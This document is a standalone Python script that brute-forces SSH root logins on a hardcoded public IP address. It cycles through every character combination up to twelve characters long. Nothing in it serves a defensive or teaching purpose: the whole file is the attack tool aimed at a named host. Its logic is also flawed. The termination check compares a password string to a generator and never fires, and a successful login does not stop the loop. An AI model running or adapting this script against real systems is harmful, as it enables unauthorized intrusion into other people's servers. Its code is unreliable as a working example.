import paramiko
import itertools
MIN_PASS_LENGTH = 1
MAX_PASS_LENGTH = 12
HOST = '47.101.154.149'
USERNAME = 'root'
def connect_ssh(password, ssh):
    try:
        ssh.connect(HOST, username=USERNAME, password=password)
        print(f"[+] Password Found: {password}")
    except paramiko.ssh_exception.AuthenticationException:
        print(f"[-] Password incorrect: {password}")
    except Exception as e:
        print(f"[-] Exception occurred while connecting: {e}")
    ssh.close()
def generate_passwords(min_len, max_len):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()?<>,./';:\"[]\\{}|_+="
    for length in range(min_len, max_len+1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)
def ssh_brute_force():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in generate_passwords(MIN_PASS_LENGTH, MAX_PASS_LENGTH):
        connect_ssh(password, ssh)
        if password == generate_passwords(MAX_PASS_LENGTH, MAX_PASS_LENGTH):
            ssh.close()
            break
if __name__ == '__main__':
    ssh_brute_force()
